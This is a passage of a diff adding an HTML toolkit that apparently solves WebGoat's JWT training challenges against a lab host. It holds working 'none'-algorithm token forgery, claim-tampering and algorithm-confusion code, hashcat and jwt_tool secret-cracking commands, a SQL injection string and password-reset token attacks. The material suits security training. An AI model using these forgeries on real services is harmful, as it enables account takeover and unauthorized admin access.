@@ -1,0 +1,1026 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebGoat JWT Complete Toolkit</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 20px;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
+        .header {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+        .header p {
+            opacity: 0.9;
+            font-size: 1.1em;
+        }
+        .tabs {
+            display: flex;
+            background: #f5f5f5;
+            border-bottom: 2px solid #ddd;
+        }
+        .tab {
+            flex: 1;
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+            background: #e0e0e0;
+            border: none;
+            font-size: 1em;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        .tab:hover {
+            background: #d0d0d0;
+        }
+        .tab.active {
+            background: white;
+            color: #667eea;
+            border-bottom: 3px solid #667eea;
+        }
+        .content {
+            padding: 30px;
+        }
+        .section {
+            display: none;
+        }
+        .section.active {
+            display: block;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #333;
+        }
+        input[type="text"], textarea, select {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 1em;
+            font-family: 'Courier New', monospace;
+        }
+        textarea {
+            min-height: 120px;
+            resize: vertical;
+        }
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-size: 1em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-right: 10px;
+            margin-bottom: 10px;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+        .output {
+            background: #f8f9fa;
+            border: 2px solid #dee2e6;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .success {
+            background: #d4edda;
+            border-color: #c3e6cb;
+            color: #155724;
+        }
+        .error {
+            background: #f8d7da;
+            border-color: #f5c6cb;
+            color: #721c24;
+        }
+        .info-box {
+            background: #e7f3ff;
+            border-left: 4px solid #2196F3;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+        }
+        .warning-box {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+        }
+        .jwt-parts {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 15px;
+            margin: 20px 0;
+        }
+        .jwt-part {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            border: 2px solid #dee2e6;
+        }
+        .jwt-part h4 {
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+        .jwt-part pre {
+            background: white;
+            padding: 10px;
+            border-radius: 4px;
+            overflow-x: auto;
+            font-size: 0.9em;
+        }
+        .attack-buttons {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        .attack-btn {
+            flex: 1;
+            min-width: 200px;
+        }
+        .curl-command {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+            margin: 10px 0;
+            white-space: pre-wrap;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 JWT Complete Toolkit</h1>
+            <p>WebGoat JWT Challenge Solver | Target: 192.168.254.112:8001</p>
+        </div>
+
+        <div class="tabs">
+            <button class="tab active" onclick="showSection(0)">Decoder</button>
+            <button class="tab" onclick="showSection(1)">Token Tampering</button>
+            <button class="tab" onclick="showSection(2)">Algorithm Confusion</button>
+            <button class="tab" onclick="showSection(3)">Weak Secrets</button>
+            <button class="tab" onclick="showSection(4)">Admin Access</button>
+            <button class="tab" onclick="showSection(5)">Password Reset</button>
+        </div>        <div class="content">
+            <!-- Section 1: JWT Decoder -->
+            <div class="section active" id="section0">
+                <h2>🔍 JWT Decoder & Encoder</h2>
+                
+                <!-- PROVEN SOLUTION BOX -->
+                <div style="background: linear-gradient(135deg, #28a745 0%, #20c997 100%); color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; box-shadow: 0 5px 15px rgba(40, 167, 69, 0.3);">
+                    <h3 style="color: white; margin-bottom: 15px;">✅ CHALLENGE 1 - PROVEN WORKING SOLUTION</h3>
+                    <p style="margin-bottom: 10px;"><strong>Tested & Working: December 14, 2025</strong></p>
+                    <p style="margin-bottom: 15px;">Copy this token and paste it into DevTools > Application > Cookies > access_token:</p>
+                    <div style="background: rgba(255,255,255,0.2); padding: 15px; border-radius: 5px; font-family: 'Courier New', monospace; word-break: break-all; margin-bottom: 15px;">
+                        eyJhbGciOiJub25lIn0.eyJpYXQiOjE3NjY1NjI5ODksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.
+                    </div>
+                    <p style="margin-bottom: 10px;"><strong>Steps:</strong></p>
+                    <ol style="margin-left: 20px; margin-bottom: 15px;">
+                        <li>F12 → Application → Cookies → http://192.168.254.112:8001</li>
+                        <li>Find "access_token", Double-click VALUE</li>
+                        <li>Ctrl+A, Delete, Paste token above, Press Enter</li>
+                        <li>Click "Delete" button (next to any user) OR refresh page</li>
+                        <li>✅ Challenge Complete!</li>
+                    </ol>
+                    <p style="margin-bottom: 10px;"><strong>⚠️ Important:</strong> Cookie is HttpOnly - JavaScript CANNOT access it! Must edit manually in DevTools Application tab.</p>
+                    <button onclick="copyChallenge1Token()" style="background: white; color: #28a745; border: none; padding: 10px 20px; border-radius: 5px; font-weight: bold; cursor: pointer;">📋 Copy Challenge 1 Token</button>
+                </div>
+                
+                <div class="info-box">
+                    <strong>📖 How JWT Works:</strong><br>
+                    JWT = Header.Payload.Signature (3 parts separated by dots)<br>
+                    - <strong>Header:</strong> Algorithm & token type<br>
+                    - <strong>Payload:</strong> Claims (user data, roles, expiration)<br>
+                    - <strong>Signature:</strong> Verification (prevents tampering)
+                </div>
+
+                <div class="form-group">
+                    <label>JWT Token to Decode:</label>
+                    <textarea id="jwtInput" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"></textarea>
+                </div>
+                <button onclick="decodeJWT()">🔓 Decode JWT</button>
+                <button onclick="loadSampleToken()">📝 Load Sample Token</button>
+
+                <div id="decodedOutput"></div>
+
+                <h3 style="margin-top: 30px;">🔨 Build Custom JWT</h3>
+                <div class="form-group">
+                    <label>Header (JSON):</label>
+                    <textarea id="customHeader">{"alg": "HS256", "typ": "JWT"}</textarea>
+                </div>
+                <div class="form-group">
+                    <label>Payload (JSON):</label>
+                    <textarea id="customPayload">{"sub": "user123", "name": "John Doe", "admin": false}</textarea>
+                </div>
+                <div class="form-group">
+                    <label>Secret Key (for signing):</label>
+                    <input type="text" id="customSecret" placeholder="Leave empty for unsigned token">
+                </div>
+                <button onclick="buildJWT()">⚙️ Build JWT</button>
+
+                <div id="builtOutput"></div>
+            </div>            <!-- Section 2: Token Tampering -->
+            <div class="section" id="section1">
+                <h2>✏️ Token Tampering Attacks</h2>
+                <div class="warning-box">
+                    <strong>⚠️ Attack Scenario:</strong><br>
+                    Modify JWT claims (e.g., change user role to admin) and bypass signature verification<br><br>
+                    <strong>⚠️ IMPORTANT FOR CHALLENGE 1:</strong> Simple tampering keeps the original signature, which will be rejected!<br>
+                    For Challenge 1, use <strong>Algorithm Confusion</strong> tab → <strong>"none" + Remove Signature</strong> instead.
+                </div>
+
+                <div class="form-group">
+                    <label>Original JWT Token:</label>
+                    <textarea id="tamperToken" placeholder="Paste your JWT token here"></textarea>
+                </div>
+
+                <div class="attack-buttons">
+                    <button class="attack-btn" onclick="tamperAdmin()">👑 Make Admin (admin: true)</button>
+                    <button class="attack-btn" onclick="tamperRole()">🎭 Change Role (role: admin)</button>
+                    <button class="attack-btn" onclick="tamperUserId()">🔑 Change User ID (sub: admin)</button>
+                    <button class="attack-btn" onclick="tamperMultiple()">💥 Multiple Changes</button>
+                </div>
+
+                <div class="form-group">
+                    <label>Custom Field to Add/Modify:</label>
+                    <input type="text" id="customField" placeholder="Field name (e.g., isAdmin)">
+                    <input type="text" id="customValue" placeholder="Value (e.g., true)" style="margin-top: 10px;">
+                    <button onclick="tamperCustom()" style="margin-top: 10px;">🛠️ Apply Custom Change</button>
+                </div>
+
+                <div id="tamperOutput"></div>
+            </div>            <!-- Section 3: Algorithm Confusion -->
+            <div class="section" id="section2">
+                <h2>🎭 Algorithm Confusion Attacks</h2>
+                <div class="warning-box">
+                    <strong>⚠️ Attack Types:</strong><br>
+                    1. <strong>"none" algorithm:</strong> Remove signature completely ✅ <strong>PROVEN TO WORK FOR CHALLENGE 1</strong><br>
+                    2. <strong>RS256 → HS256:</strong> Change asymmetric to symmetric<br>
+                    3. <strong>Signature removal:</strong> Strip signature and modify alg
+                </div>
+
+                <div class="info-box">
+                    <strong>✅ CHALLENGE 1 METHOD:</strong><br>
+                    Use <strong>"none" + Remove Signature</strong> to bypass validation.<br>
+                    The server accepts algorithm "none" which skips signature verification entirely.<br>
+                    <strong>Remember:</strong> Cookie is HttpOnly - edit in DevTools Application > Cookies, NOT JavaScript console!
+                </div>
+
+                <div class="form-group">
+                    <label>JWT Token for Algorithm Attack:</label>
+                    <textarea id="algToken" placeholder="Paste your JWT token here"></textarea>
+                </div>
+
+                <div class="attack-buttons">
+                    <button class="attack-btn" onclick="algNone()">🚫 Set Algorithm to "none"</button>
+                    <button class="attack-btn" onclick="algNoneRemoveSig()">✂️ "none" + Remove Signature</button>
+                    <button class="attack-btn" onclick="algRS256toHS256()">🔄 RS256 → HS256</button>
+                    <button class="attack-btn" onclick="algRemoveSignature()">🗑️ Remove Signature Only</button>
+                </div>
+
+                <div class="form-group" style="margin-top: 20px;">
+                    <label>Public Key (for RS256→HS256 attack):</label>
+                    <textarea id="publicKey" placeholder="-----BEGIN PUBLIC KEY-----&#10;...&#10;-----END PUBLIC KEY-----"></textarea>
+                    <button onclick="algRS256withKey()">🔐 Generate HS256 with Public Key</button>
+                </div>
+
+                <div id="algOutput"></div>
+            </div>
+
+            <!-- Section 4: Weak Secret Brute Force -->
+            <div class="section" id="section3">
+                <h2>🔨 Weak Secret Brute Forcing</h2>
+                <div class="info-box">
+                    <strong>📖 About This Attack:</strong><br>
+                    Try common/weak secrets to crack JWT signatures. Use external tools for serious cracking:<br>
+                    - <strong>jwt_tool:</strong> python jwt_tool.py TOKEN -C -d wordlist.txt<br>
+                    - <strong>hashcat:</strong> hashcat -m 16500 jwt.txt wordlist.txt<br>
+                    - <strong>john:</strong> john --format=HMAC-SHA256 jwt.txt
+                </div>
+
+                <div class="form-group">
+                    <label>JWT Token to Crack:</label>
+                    <textarea id="crackToken" placeholder="Paste JWT with weak secret"></textarea>
+                </div>
+
+                <div class="form-group">
+                    <label>Wordlist (one per line):</label>
+                    <textarea id="wordlist" placeholder="secret&#10;password&#10;123456&#10;webgoat&#10;admin">secret
+password
+123456
+webgoat
+admin
+test
+qwerty
+letmein
+welcome
+monkey
+sunshine
+password123
+admin123
+root</textarea>
+                </div>
+
+                <button onclick="bruteForceSecret()">🔓 Brute Force Secret</button>
+                <button onclick="loadCommonSecrets()">📋 Load Common Secrets</button>
+
+                <div id="crackOutput"></div>
+
+                <h3 style="margin-top: 30px;">🔑 Sign with Found Secret</h3>
+                <div class="form-group">
+                    <label>Payload (JSON):</label>
+                    <textarea id="resignPayload">{"sub": "admin", "admin": true}</textarea>
+                </div>
+                <div class="form-group">
+                    <label>Secret Key:</label>
+                    <input type="text" id="resignSecret" placeholder="Enter the cracked secret">
+                </div>
+                <button onclick="resignToken()">✍️ Sign New Token</button>
+
+                <div id="resignOutput"></div>
+            </div>            <!-- Section 5: Admin Access Attack -->
+            <div class="section" id="section4">
+                <h2>👑 Become Admin Attack</h2>
+                
+                <div style="background: linear-gradient(135deg, #28a745 0%, #20c997 100%); color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px;">
+                    <h3 style="color: white; margin-bottom: 10px;">✅ PROVEN WORKING METHOD FOR CHALLENGE 1</h3>
+                    <p style="margin-bottom: 10px;"><strong>Use Algorithm "none" attack, NOT simple tampering!</strong></p>
+                    <p style="margin-bottom: 15px;">Go to <strong>Algorithm Confusion</strong> tab → Use <strong>"none" + Remove Signature</strong> button</p>
+                    <p><strong>Why?</strong> Simple tampering keeps the old signature which gets rejected. Algorithm "none" removes signature validation entirely.</p>
+                </div>
+                
+                <div class="warning-box">
+                    <strong>⚠️ Common WebGoat Challenges:</strong><br>
+                    - SQL Injection in JWT (username: admin' OR '1'='1)<br>
+                    - Modify claims to gain admin privileges<br>
+                    - Bypass authorization checks<br><br>
+                    <strong>⚠️ HttpOnly Cookie Warning:</strong><br>
+                    If document.cookie returns "", the cookie is HttpOnly!<br>
+                    You MUST edit it in DevTools > Application > Cookies tab (JavaScript console will NOT work)
+                </div>
+
+                <div class="form-group">
+                    <label>Your Current JWT Token:</label>
+                    <textarea id="adminToken" placeholder="Paste your current token"></textarea>
+                </div>
+
+                <div class="form-group">
+                    <label>WebGoat URL:</label>
+                    <input type="text" id="adminUrl" value="http://192.168.254.112:8001/WebGoat/JWT">
+                </div>
+
+                <div class="attack-buttons">
+                    <button class="attack-btn" onclick="adminMethod1()">🎯 Method 1: Set admin=true</button>
+                    <button class="attack-btn" onclick="adminMethod2()">🎯 Method 2: Change username to admin</button>
+                    <button class="attack-btn" onclick="adminMethod3()">🎯 Method 3: SQL Injection in JWT</button>
+                    <button class="attack-btn" onclick="adminMethod4()">🎯 Method 4: Role escalation</button>
+                </div>
+
+                <div id="adminOutput"></div>
+            </div>
+
+            <!-- Section 6: Password Reset Attack -->
+            <div class="section" id="section5">
+                <h2>🔓 JWT Password Reset Attack</h2>
+                <div class="warning-box">
+                    <strong>⚠️ Attack Scenario:</strong><br>
+                    Password reset tokens are often JWTs. Tamper with the token to reset another user's password.
+                </div>
+
+                <div class="form-group">
+                    <label>Password Reset JWT Token:</label>
+                    <textarea id="resetToken" placeholder="Paste password reset token"></textarea>
+                </div>
+
+                <div class="form-group">
+                    <label>Target Username:</label>
+                    <input type="text" id="targetUser" placeholder="admin" value="admin">
+                </div>
+
+                <div class="form-group">
+                    <label>New Password:</label>
+                    <input type="text" id="newPassword" placeholder="hacked123">
+                </div>
+
+                <div class="attack-buttons">
+                    <button class="attack-btn" onclick="resetMethod1()">🔑 Method 1: Change username in token</button>
+                    <button class="attack-btn" onclick="resetMethod2()">🔑 Method 2: Remove signature</button>
+                    <button class="attack-btn" onclick="resetMethod3()">🔑 Method 3: Algorithm to "none"</button>
+                    <button class="attack-btn" onclick="resetMethod4()">🔑 Method 4: Brute force & re-sign</button>
+                </div>
+
+                <div class="form-group" style="margin-top: 20px;">
+                    <label>Reset Endpoint URL:</label>
+                    <input type="text" id="resetUrl" value="http://192.168.254.112:8001/WebGoat/PasswordReset/reset">
+                </div>
+
+                <button onclick="generateResetCurl()">📋 Generate cURL Command</button>
+
+                <div id="resetOutput"></div>
+            </div>
+        </div>
+    </div>    <script>
+        // Copy Challenge 1 Token Function
+        function copyChallenge1Token() {
+            const token = 'eyJhbGciOiJub25lIn0.eyJpYXQiOjE3NjY1NjI5ODksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.';
+            copyToClipboard(token);
+        }
+
+        // Tab switching
+        function showSection(index) {
+            const sections = document.querySelectorAll('.section');
+            const tabs = document.querySelectorAll('.tab');
+            
+            sections.forEach(s => s.classList.remove('active'));
+            tabs.forEach(t => t.classList.remove('active'));
+            
+            sections[index].classList.add('active');
+            tabs[index].classList.add('active');
+        }
+
+        // Base64 URL encoding/decoding
+        function base64UrlEncode(str) {
+            return btoa(str)
+                .replace(/\+/g, '-')
+                .replace(/\//g, '_')
+                .replace(/=+$/, '');
+        }
+
+        function base64UrlDecode(str) {
+            str = str.replace(/-/g, '+').replace(/_/g, '/');
+            while (str.length % 4) str += '=';
+            return atob(str);
+        }
+
+        // JWT Decoder
+        function decodeJWT() {
+            const token = document.getElementById('jwtInput').value.trim();
+            const output = document.getElementById('decodedOutput');
+            
+            try {
+                const parts = token.split('.');
+                if (parts.length !== 3) {
+                    throw new Error('Invalid JWT format. Expected 3 parts.');
+                }
+
+                const header = JSON.parse(base64UrlDecode(parts[0]));
+                const payload = JSON.parse(base64UrlDecode(parts[1]));
+                const signature = parts[2];
+
+                let html = '<div class="jwt-parts">';
+                html += '<div class="jwt-part"><h4>Header</h4><pre>' + JSON.stringify(header, null, 2) + '</pre></div>';
+                html += '<div class="jwt-part"><h4>Payload</h4><pre>' + JSON.stringify(payload, null, 2) + '</pre></div>';
+                html += '<div class="jwt-part"><h4>Signature</h4><pre>' + signature + '</pre></div>';
+                html += '</div>';
+
+                html += '<div class="output success">';
+                html += '<strong>✅ Successfully Decoded JWT</strong><br><br>';
+                html += '<strong>Algorithm:</strong> ' + header.alg + '<br>';
+                html += '<strong>Token Type:</strong> ' + header.typ + '<br><br>';
+                html += '<strong>Claims:</strong><br>';
+                for (let key in payload) {
+                    html += '  • ' + key + ': ' + JSON.stringify(payload[key]) + '<br>';
+                }
+                html += '</div>';
+
+                output.innerHTML = html;
+            } catch (e) {
+                output.innerHTML = '<div class="output error">❌ Error: ' + e.message + '</div>';
+            }
+        }
+
+        function loadSampleToken() {
+            const sampleToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOmZhbHNlLCJpYXQiOjE1MTYyMzkwMjJ9.lnhC3e2XRj_71I2SxFcFLcUxED6y0TgYVHBQq5nPCqE';
+            document.getElementById('jwtInput').value = sampleToken;
+            decodeJWT();
+        }
+
+        function buildJWT() {
+            const headerText = document.getElementById('customHeader').value;
+            const payloadText = document.getElementById('customPayload').value;
+            const secret = document.getElementById('customSecret').value;
+            const output = document.getElementById('builtOutput');
+
+            try {
+                const header = JSON.parse(headerText);
+                const payload = JSON.parse(payloadText);
+
+                const headerEncoded = base64UrlEncode(JSON.stringify(header));
+                const payloadEncoded = base64UrlEncode(JSON.stringify(payload));
+
+                let token = headerEncoded + '.' + payloadEncoded;
+
+                if (secret) {
+                    // Simple HMAC-SHA256 (for demo - use proper library in production)
+                    token += '.SIGNATURE_HERE';
+                    output.innerHTML = '<div class="output warning">⚠️ Note: This is an unsigned token. Use external tools for proper signing:<br><br>' +
+                        '<strong>Token:</strong><br>' + token + '<br><br>' +
+                        '<strong>Use jwt.io or jwt_tool for proper signing with secret.</strong></div>';
+                } else {
+                    token += '.';
+                    output.innerHTML = '<div class="output success">✅ <strong>Unsigned JWT Token:</strong><br><br>' + token + '</div>';
+                }
+            } catch (e) {
+                output.innerHTML = '<div class="output error">❌ Error: ' + e.message + '</div>';
+            }
+        }
+
+        // Token Tampering Functions
+        function tamperAdmin() {
+            const token = document.getElementById('tamperToken').value.trim();
+            tamperToken(token, { admin: true });
+        }
+
+        function tamperRole() {
+            const token = document.getElementById('tamperToken').value.trim();
+            tamperToken(token, { role: 'admin' });
+        }
+
+        function tamperUserId() {
+            const token = document.getElementById('tamperToken').value.trim();
+            tamperToken(token, { sub: 'admin' });
+        }
+
+        function tamperMultiple() {
+            const token = document.getElementById('tamperToken').value.trim();
+            tamperToken(token, { admin: true, role: 'admin', sub: 'admin' });
+        }
+
+        function tamperCustom() {
+            const token = document.getElementById('tamperToken').value.trim();
+            const field = document.getElementById('customField').value;
+            const value = document.getElementById('customValue').value;
+            
+            if (!field) {
+                alert('Please enter a field name');
+                return;
+            }
+
+            let parsedValue = value;
+            try {
+                parsedValue = JSON.parse(value);
+            } catch (e) {
+                // Keep as string if not valid JSON
+            }
+
+            const changes = {};
+            changes[field] = parsedValue;
+            tamperToken(token, changes);
+        }
+
+        function tamperToken(token, changes) {
+            const output = document.getElementById('tamperOutput');
+            
+            try {
+                const parts = token.split('.');
+                if (parts.length !== 3) throw new Error('Invalid JWT format');
+
+                const header = JSON.parse(base64UrlDecode(parts[0]));
+                const payload = JSON.parse(base64UrlDecode(parts[1]));
+
+                // Apply changes
+                for (let key in changes) {
+                    payload[key] = changes[key];
+                }
+
+                const newHeader = base64UrlEncode(JSON.stringify(header));
+                const newPayload = base64UrlEncode(JSON.stringify(payload));
+                const newToken = newHeader + '.' + newPayload + '.' + parts[2];
+
+                let html = '<div class="output success">';
+                html += '<strong>✅ Tampered Token Created</strong><br><br>';
+                html += '<strong>Changes Applied:</strong><br>';
+                for (let key in changes) {
+                    html += '  • ' + key + ' = ' + JSON.stringify(changes[key]) + '<br>';
+                }
+                html += '<br><strong>New Payload:</strong><br><pre>' + JSON.stringify(payload, null, 2) + '</pre>';
+                html += '<br><strong>Tampered JWT Token:</strong><br>' + newToken;
+                html += '<br><br><button onclick="copyToClipboard(\'' + newToken + '\')">📋 Copy Token</button>';
+                html += '</div>';
+
+                html += '<div class="curl-command">curl -X POST http://192.168.254.112:8001/WebGoat/JWT/[endpoint] \\\n';
+                html += '  -H "Authorization: Bearer ' + newToken + '" \\\n';
+                html += '  -H "Content-Type: application/json"</div>';
+
+                output.innerHTML = html;
+            } catch (e) {
+                output.innerHTML = '<div class="output error">❌ Error: ' + e.message + '</div>';
+            }
+        }
+
+        // Algorithm Confusion Attacks
+        function algNone() {
+            const token = document.getElementById('algToken').value.trim();
+            changeAlgorithm(token, 'none', false);
+        }        function algNoneRemoveSig() {
+            const token = document.getElementById('algToken').value.trim();
+            const output = document.getElementById('algOutput');
+            
+            try {
+                const parts = token.split('.');
+                const header = JSON.parse(base64UrlDecode(parts[0]));
+                const payload = JSON.parse(base64UrlDecode(parts[1]));
+                
+                // Change algorithm to "none"
+                header.alg = 'none';
+                
+                // Set admin to true (for Challenge 1)
+                payload.admin = "true";
+                
+                const newHeader = base64UrlEncode(JSON.stringify(header));
+                const newPayload = base64UrlEncode(JSON.stringify(payload));
+                const newToken = newHeader + '.' + newPayload + '.';
+
+                let html = '<div class="output success">';
+                html += '<strong>✅ Algorithm "none" Attack Token Created</strong><br><br>';
+                html += '<strong>Changes Applied:</strong><br>';
+                html += '  • Algorithm: ' + parts[0] + ' → none<br>';
+                html += '  • Admin: false → true<br>';
+                html += '  • Signature: REMOVED<br>';
+                html += '<br><strong>New Header:</strong><br><pre>' + JSON.stringify(header, null, 2) + '</pre>';
+                html += '<br><strong>New Payload:</strong><br><pre>' + JSON.stringify(payload, null, 2) + '</pre>';
+                html += '<br><strong>Attack Token (Ready for Challenge 1):</strong><br>' + newToken;
+                html += '<br><br><button onclick="copyToClipboard(\'' + newToken + '\')">📋 Copy Token</button>';
+                html += '</div>';
+                
+                html += '<div class="info-box" style="margin-top: 20px;">';
+                html += '<strong>📋 How to Use This Token:</strong><br>';
+                html += '1. Press F12 in browser<br>';
+                html += '2. Go to: Application > Cookies > http://192.168.254.112:8001<br>';
+                html += '3. Find "access_token" cookie<br>';
+                html += '4. Double-click VALUE column, Delete old token<br>';
+                html += '5. Paste this token, Press Enter<br>';
+                html += '6. Click "Delete" button next to any user OR refresh page<br>';
+                html += '7. ✅ Challenge Complete!<br><br>';
+                html += '<strong>⚠️ Remember:</strong> Cookie is HttpOnly - JavaScript console does NOT work!';
+                html += '</div>';
+
+                output.innerHTML = html;
+            } catch (e) {
+                output.innerHTML = '<div class="output error">❌ Error: ' + e.message + '</div>';
+            }
+        }
+
+        function algRS256toHS256() {
+            const token = document.getElementById('algToken').value.trim();
+            changeAlgorithm(token, 'HS256', false);
+        }
+
+        function algRemoveSignature() {
+            const token = document.getElementById('algToken').value.trim();
+            const output = document.getElementById('algOutput');
+            
+            try {
+                const parts = token.split('.');
+                const newToken = parts[0] + '.' + parts[1] + '.';
+
+                output.innerHTML = '<div class="output success">' +
+                    '<strong>✅ Signature Removed</strong><br><br>' +
+                    '<strong>New Token:</strong><br>' + newToken +
+                    '<br><br><button onclick="copyToClipboard(\'' + newToken + '\')">📋 Copy Token</button></div>';
+            } catch (e) {
+                output.innerHTML = '<div class="output error">❌ Error: ' + e.message + '</div>';
+            }
+        }
+
+        function changeAlgorithm(token, newAlg, removeSig) {
+            const output = document.getElementById('algOutput');
+            
+            try {
+                const parts = token.split('.');
+                const header = JSON.parse(base64UrlDecode(parts[0]));
+                
+                header.alg = newAlg;
+                
+                const newHeader = base64UrlEncode(JSON.stringify(header));
+                const newToken = newHeader + '.' + parts[1] + (removeSig ? '.' : '.' + parts[2]);
+
+                let html = '<div class="output success">';
+                html += '<strong>✅ Algorithm Changed</strong><br><br>';
+                html += '<strong>New Algorithm:</strong> ' + newAlg + '<br>';
+                if (removeSig) html += '<strong>Signature:</strong> Removed<br>';
+                html += '<br><strong>New Header:</strong><br><pre>' + JSON.stringify(header, null, 2) + '</pre>';
+                html += '<br><strong>New Token:</strong><br>' + newToken;
+                html += '<br><br><button onclick="copyToClipboard(\'' + newToken + '\')">📋 Copy Token</button>';
+                html += '</div>';
+
+                output.innerHTML = html;
+            } catch (e) {
+                output.innerHTML = '<div class="output error">❌ Error: ' + e.message + '</div>';
+            }
+        }
+
+        function algRS256withKey() {
+            const output = document.getElementById('algOutput');
+            output.innerHTML = '<div class="output warning">⚠️ <strong>RS256→HS256 Attack Requires External Tools</strong><br><br>' +
+                'This attack requires proper cryptographic libraries. Use:<br><br>' +
+                '<strong>1. jwt_tool:</strong><br>' +
+                'python jwt_tool.py TOKEN -X k -pk public.pem<br><br>' +
+                '<strong>2. Manual with Python:</strong><br>' +
+                'Use the PowerShell script jwt_automation.ps1 for this attack.<br><br>' +
+                '<strong>Theory:</strong> Change RS256 (asymmetric) to HS256 (symmetric) and sign with the public key as the secret.</div>';
+        }
+
+        // Brute Force Functions
+        function bruteForceSecret() {
+            const token = document.getElementById('crackToken').value.trim();
+            const wordlist = document.getElementById('wordlist').value.split('\n').filter(w => w.trim());
+            const output = document.getElementById('crackOutput');
+
+            output.innerHTML = '<div class="output">🔄 Brute forcing... Testing ' + wordlist.length + ' secrets...</div>';
+
+            // Note: This is a simple demo. Real brute forcing requires proper HMAC-SHA256
+            setTimeout(() => {
+                output.innerHTML = '<div class="output warning">⚠️ <strong>Browser Limitation</strong><br><br>' +
+                    'JWT signature verification requires proper HMAC-SHA256 implementation.<br><br>' +
+                    '<strong>Use External Tools:</strong><br>' +
+                    '1. <strong>jwt_tool:</strong> python jwt_tool.py ' + token + ' -C -d wordlist.txt<br>' +
+                    '2. <strong>hashcat:</strong> hashcat -m 16500 jwt.txt wordlist.txt<br>' +
+                    '3. <strong>john:</strong> john --format=HMAC-SHA256 jwt.txt<br><br>' +
+                    '<strong>Common WebGoat Secrets:</strong> secret, webgoat, password, 123456</div>';
+            }, 1000);
+        }
+
+        function loadCommonSecrets() {
+            const commonSecrets = `secret
+webgoat
+password
+123456
+admin
+test
+qwerty
+letmein
+welcome
+password123
+admin123
+jwt
+token
+key
+supersecret
+mysecret`;
+            document.getElementById('wordlist').value = commonSecrets;
+        }
+
+        function resignToken() {
+            const payloadText = document.getElementById('resignPayload').value;
+            const secret = document.getElementById('resignSecret').value;
+            const output = document.getElementById('resignOutput');
+
+            if (!secret) {
+                output.innerHTML = '<div class="output error">❌ Please enter a secret key</div>';
+                return;
+            }
+
+            output.innerHTML = '<div class="output warning">⚠️ <strong>Signing Requires External Tools</strong><br><br>' +
+                'Use the PowerShell script jwt_automation.ps1 to sign tokens with secrets.<br><br>' +
+                '<strong>Or use jwt.io:</strong><br>' +
+                '1. Go to https://jwt.io/<br>' +
+                '2. Paste your payload<br>' +
+                '3. Enter secret: ' + secret + '<br>' +
+                '4. Copy the generated token</div>';
+        }
+
+        // Admin Access Functions
+        function adminMethod1() {
+            const token = document.getElementById('adminToken').value.trim();
+            try {
+                const parts = token.split('.');
+                const payload = JSON.parse(base64UrlDecode(parts[1]));
+                payload.admin = true;
+                
+                const newPayload = base64UrlEncode(JSON.stringify(payload));
+                const newToken = parts[0] + '.' + newPayload + '.' + parts[2];
+                
+                displayAdminResult('Set admin=true', newToken, payload);
+            } catch (e) {
+                document.getElementById('adminOutput').innerHTML = '<div class="output error">❌ Error: ' + e.message + '</div>';
+            }
+        }
+
+        function adminMethod2() {
+            const token = document.getElementById('adminToken').value.trim();
+            try {
+                const parts = token.split('.');
+                const payload = JSON.parse(base64UrlDecode(parts[1]));
+                payload.sub = 'admin';
+                payload.name = 'admin';
+                
+                const newPayload = base64UrlEncode(JSON.stringify(payload));
+                const newToken = parts[0] + '.' + newPayload + '.' + parts[2];
+                
+                displayAdminResult('Changed username to admin', newToken, payload);
+            } catch (e) {
+                document.getElementById('adminOutput').innerHTML = '<div class="output error">❌ Error: ' + e.message + '</div>';
+            }
+        }
